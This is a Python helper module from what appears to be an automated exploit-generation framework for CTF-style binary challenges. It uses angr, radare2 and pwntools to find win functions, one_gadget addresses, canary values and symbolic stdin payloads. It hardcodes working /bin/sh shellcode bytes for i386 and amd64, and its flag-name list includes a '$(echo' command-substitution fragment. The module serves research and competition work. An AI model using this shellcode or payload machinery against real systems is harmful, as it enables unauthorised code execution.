from subprocess import Popen

import angr
import claripy
from pwn import *
import json
from pwnlib.elf.elf import Function

known_flag_names = ["/bin/sh\x00", " flag\x00", "/bin/bash\x00", "flag.txt\x00"]
stupid_rhg_flag_names = ["$(echo"]
known_flag_names.append(*stupid_rhg_flag_names)
known_flag_funcs = ['system', 'open', 'execve']
known_win_funcs = ['system', 'open', 'execve']

ARCH_64_BASE = 0x666cdead_00000000
ARCH_64_LIBC_BASE = 0x666cc0de_00000000
ARCH_64_MMAP_BASE = 0x666cbeef_00000000
ARCH_64_HEAP_BASE = 0x666c1337_00000000
ARCH_32_BASE = 0x666c0000
ARCH_64_PRE = b'\xad\xde\x6c\x66'
ARCH_64_MMAP_PRE = b'\xef\xbe\x6c\x66'
ARCH_64_HEAP_PRE = b'\x37\x13\x6c\x66'
ARCH_32_PRE = b'\x6c\x66'
ARCH_64_PRE_HEX = hex(ARCH_64_BASE)[2:10].encode()
ARCH_64_MMAP_PRE_HEX = hex(ARCH_64_MMAP_BASE)[2:10].encode()
ARCH_64_HEAP_PRE_HEX = hex(ARCH_64_HEAP_BASE)[2:10].encode()
ARCH_32_PRE_HEX = hex(ARCH_32_BASE)[2:6].encode()

LEAK_COMMON = b'\x6c\x66'
LEAK_COMMON_HEX = b'0x666c'

CANARY = b'\x00YRANAC_'


class FlagFound(Exception):
    pass


class HeapOverflowInspector:
    def __init__(self, overflow_addr, overflow_size, overflow_value, call_back_tag):
        self.overflow_addr = overflow_addr
        self.overflow_size = overflow_size
        self.overflow_value = overflow_value
        self.call_back_tag = call_back_tag


def get_win_functions(challenge):
    """
    :return: address list that possibly are win functions
    use R2 as backend, we may also use angr as backend
    greedy search win functions, xref for inst load backdoor str and check bb that calls system
    """
    win_addr = []
    r2 = challenge.get_r2()
    if not challenge.target_binary.linker:  # aaaa may raise error
        challenge.r2_op('af@@@i')
        challenge.r2_op('afva@@@F')
        challenge.r2_op('aar')
        challenge.r2_op('avrr')
        challenge.r2_op('aaft')
        challenge.r2_op('aanr')
        challenge.r2_op('/azs')
        challenge.r2_op('aap')
    else:
        challenge.r2_op('aa')
        challenge.r2_op('aac')
        challenge.r2_op('aaaa')
    functions = [func for func in r2.cmdj('aflj')]
    string_used_addr = {}
    strings = [string_ for string_ in r2.cmdj('izj')]
    for string_ in strings:
        value = string_['string']
        if any([x[:-1] in value for x in known_flag_names]):
            address = string_['vaddr']
            refs = [func for func in json.loads(r2.cmd('axtj @ {}'.format(address)))]
            # print(value, [hex(ref['from']) for ref in refs])
            for ref in refs:
                if 'fcn_name' in ref:
                    string_used_addr[ref['fcn_name']] = ref['from']
    for func in functions:
        for name_ in known_flag_funcs:
            if name_ in str(func['name']):
                refs = [func for func in json.loads(r2.cmd('axtj @ {}'.format(func['name'])))]
                for ref in refs:
                    if 'fcn_name' in ref and ref['type'] == 'CALL':
                        if ref['fcn_name'] in string_used_addr and string_used_addr[ref['fcn_name']] < ref['from']:
                            log.info(f"Found win at {hex(string_used_addr[ref['fcn_name']])}")
                            win_addr.append(string_used_addr[ref['fcn_name']])
                        elif len(string_used_addr) == 0 and len(refs) == 1 and name_ in known_win_funcs:
                            func_dec = r2.cmd('pdf @ {}'.format(ref['fcn_addr']))
                            place = re.findall(
                                r'0x[0-9a-f]{8,16}\s+[0-9a-f]+\s+j[nem]+.*?\n.*?0x([0-9a-f]{8,16})',
                                func_dec)
                            place += re.findall(r'0x([0-9a-f]{8,16})\s+[0-9a-f]+\s+push ebp', func_dec)
                            place = [int(x, 16) for x in place]
                            place = [x for x in place if x < ref['from']]
                            if place:
                                jmp = max(place)
                                if jmp:
                                    log.info(f"Found possible win_func at {hex(jmp)}")
                                    win_addr.append(jmp)
    if string_used_addr and not win_addr:
        log.info(f"Force use string cross reference as win_func")
        win_addr.append(string_used_addr[list(string_used_addr.keys())[0]])
    return win_addr


def greedy_backward_search(challenge, target_addr, start_addr=None, max_depth=8):
    if max_depth == 0:
        return []
    r2 = challenge.get_r2()
    challenge.r2_op('aaaa')
    if start_addr is None:
        start_addr = r2.cmdj('iej')[0]['vaddr']
    if start_addr != target_addr:
        xrefs = None
        target_bb_addr = target_addr
        while not xrefs:
            target_bb_addr = r2.cmdj(f'afbij @ {target_bb_addr}')
            if type(target_bb_addr) is list:  # radare2/pull/22948
                target_bb_addr = target_bb_addr[0].get('addr')
            else:
                target_bb_addr = target_bb_addr.get('addr')
            if target_bb_addr is None:
                return [target_addr]
            xrefs = r2.cmdj(f'axtj @ {target_bb_addr}')
            xrefs = [i for i in xrefs if i['type'] == 'CALL' or str(i.get("opcode")).startswith('j')
                     or str(i.get("flag")).startswith('entry')]
            target_bb_addr -= 1  # todo: better way to find the start address
        for i in xrefs:
            r = greedy_backward_search(challenge, i['from'], start_addr, max_depth - 1)
            if r:
                r.append(target_addr)
                return r  # Only get the first one found
    else:
        return [target_addr]


def pre_process_flirt(challenge):
    r2 = challenge.get_r2()
    challenge.r2_op('aa')  # aaaa is better, but takes longer time
    challenge.r2_op('aac')
    if type(challenge.target_property["flirt"]) is list:
        for flirt in challenge.target_property["flirt"]:
            challenge.r2_op(f'zfs {flirt}')
    else:
        r2.cmd(f'zfs {challenge.target_property["flirt"]}')
    functions = [func for func in r2.cmdj('aflj')]
    recognized_functions = []
    for func in functions:
        if func['name'][:6] == 'flirt.':
            if '__libc_start_main' in func['name']:
                real_name = func['name'][6:].replace('___', '__')
            else:
                real_name = func['name'][6:].replace('_libc_', '').replace('_IO_', '').replace('_', '')
            if real_name in challenge.hook_table:
                recognized_functions.append((real_name, Function(real_name, func['offset'], func['size'], challenge)))
    log.info(f"Found {len(recognized_functions)} functions in total {len(functions)}")
    return recognized_functions


def dump_payload(sim_state, reset_stdin=True):
    _bin = sim_state.globals['binary']
    if _bin.io_seg_addr.get('stdin_offset') and len(sim_state.posix.stdin.content) > 1:
        sim_state = sim_state.copy()
        sim_state.posix.stdin.content = sim_state.posix.stdin.content[_bin.io_seg_addr.get('stdin_offset'):]
    if reset_stdin:
        if _bin.new_stack_addr:
            constraints = [sim_state.memory.load(_bin.new_stack_symbol, size=_bin.arch_bytes) == _bin.new_stack_addr]
            if sim_state.satisfiable(extra_constraints=constraints):
                sim_state.add_constraints(*constraints)
        _bin.io_seg_addr['stdin_offset'] = 0
    dumped_stdin = sim_state.posix.dumps(0)
    if _bin.io_seg_addr.get('Canary'):
        dumped_stdin = dumped_stdin.replace(CANARY, _bin.io_seg_addr['Canary'])
    return dumped_stdin


def get_func_block_by_r2(binary):
    r2 = binary.get_r2()
    binary.r2_op('aa')  # aaaa is better, but takes longer time
    functions = [func for func in r2.cmdj('aflj')]
    get_functions = {}
    for func in functions:
        get_functions[func['name']] = {'addr': func['offset'], 'size': func['size']}
    log.info(f"Found {len(get_functions)} functions")
    return get_functions


def analyze_leak_detail():
    pass


def little_endian(data_, arch_bits):
    result = 0
    for i in range(arch_bits):
        result += (data_ & 0xff) << 8 * (arch_bits - i - 1)
        data_ = data_ >> 8
    return result


def generate_leak_string(state: angr.SimState, string_length: int, mem_addr, binary_):
    printable_payload = cyclic(string_length)
    constraint = state.memory.load(mem_addr, size=string_length) == printable_payload
    if state.solver.satisfiable(extra_constraints=[constraint]):
        state.solver.add(constraint)
        log.info(f"Successfully generate printable payload with length {string_length}")
        return printable_payload
    else:
        constraints = [state.memory.load(mem_addr + i, size=1) != 0 for i in range(string_length)]
        if state.solver.satisfiable(extra_constraints=constraints):
            state.solver.add(*constraints)
            log.info(f"Successfully generate payload with length {string_length}")
            stdin = dump_payload(state, False)
            index = len(stdin) - 1
            while stdin[index] == b'\x00':
                index -= 1
            return stdin[index - string_length:index]


def get_one_gadget(challenge):
    one_gadget = Popen(['one_gadget', challenge.target_property['libc']], stdout=PIPE)
    lines = one_gadget.communicate()[0].split(b'\n')

    gadget_address = []
    for i in lines:
        if b'/bin/sh' in i and i[:2] == b'0x':
            log.info("One Gadget {}".format(i))
            gadget_address.append(i.split(b' ')[0])
    return [int(addr, 16) for addr in gadget_address]


def get_shellcode(target_property):
    # return b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
    context.arch = target_property['arch']
    if context.arch == 'i386':  # /bin/sh shellcode - 23 bytes
        shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
        # b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
    elif context.arch == 'amd64':  # /bin/sh shellcode - 23 bytes
        shellcode = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
        # b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
    else:
        assembly = shellcraft.sh()  # This works, but the shellcode is usually long
        shellcode = asm(assembly)
    shellcode = shellcode.rjust(len(shellcode) // 8 * 8 + 8, b'\x90')
    return shellcode


def get_max_str_len(state, start, right=0x200, binary_search=False):
    try:
        if binary_search:
            left = 0
            while True:
                mid = left + (right - left) // 2
                if left == mid:
                    break
                else:
                    constraint = [state.memory.load(start + i, size=1) != 0 for i in range(mid)]
                    if state.solver.satisfiable(extra_constraints=constraint):
                        left = mid
                    else:
                        right = mid
            return mid
        else:
            value = state.memory.load(start, right)
            find = 0
            for c in value.chop(8):  # Chop by byte
                find += 1
                if not state.solver.satisfiable([c != 0x00]):
                    return find - 1
            return find
    except Exception as e:
        if str(e) == "Size must be concretely resolved by this point in the memory stack" and right > 1:
            return get_max_str_len(state, start, right >> 1, binary_search)
        return 0


def strip_zero_in_payload(payload, is_raw=False):
    # keep prefix zeros
    first_nonzero_index = 9999
    for i in range(len(payload) - 1, -1, -1):
        if payload[i] != 0:
            first_nonzero_index = i
            break
    if not is_raw:
        first_nonzero_index = first_nonzero_index // 8 * 8 + 12  # assure work in x64
    return payload[:first_nonzero_index + 1]


def reorder_successors(sim: angr.SimProcedure, successors: list):
    ret = sim.state.stack_pop()
    sim.state.stack_push(ret)
    for i in range(len(successors)):  # https://github.com/angr/angr-doc/blob/master/docs/paths.md
        sim.successors.add_successor(successors[i], ret, claripy.true(), 'Ijk_Ret')


def get_chunk_by_addr(binary, addr):
    if addr in binary.chunk_maps:
        return binary.chunk_maps[addr]
    else:
        for chunk in binary.chunk_maps.values():
            if chunk.address < addr < chunk.address + chunk.size:
                return chunk
        return None


def get_chunk_by_tag(binary, tag):
    if tag == 'known_real_addr':
        for chunk in binary.chunk_maps.values():
            if chunk.real_addr:
                return chunk
        return None
    else:
        for chunk in binary.chunk_maps.values():
            if chunk.tag == tag:
                return chunk
        return None


def get_max_successive_symbolic_byte(_symbolic_list):
    position = 0
    count = 0
    greatest_count = 0
    for i in range(1, len(_symbolic_list)):
        if _symbolic_list[i] and _symbolic_list[i] == _symbolic_list[i - 1]:
            count = count + 1
            if count > greatest_count:
                greatest_count = count
                position = i - count
        else:
            if count > greatest_count:
                greatest_count = count
                position = i - 1 - count
                # previous position minus greatest count
            count = 0
    return position, greatest_count


def hook_libc_start_main(angr_proj, entry, libc_procedure):
    log.info(f"Project entry: {hex(entry)}")
    for _ in range(5):
        next_block_addr = entry + angr_proj.factory.block(entry).vex.size
        if angr_proj.factory.block(next_block_addr).capstone.insns[0].mnemonic == 'hlt' and \
                angr_proj.factory.block(entry).capstone.insns[-1].mnemonic == 'call':
            __libc_start_main_addr = angr_proj.factory.block(entry).instruction_addrs[-1]
            log.success(f"Hook __libc_start_main at {hex(__libc_start_main_addr)}")
            angr_proj.hook(__libc_start_main_addr, libc_procedure)
            return
        else:
            entry = next_block_addr
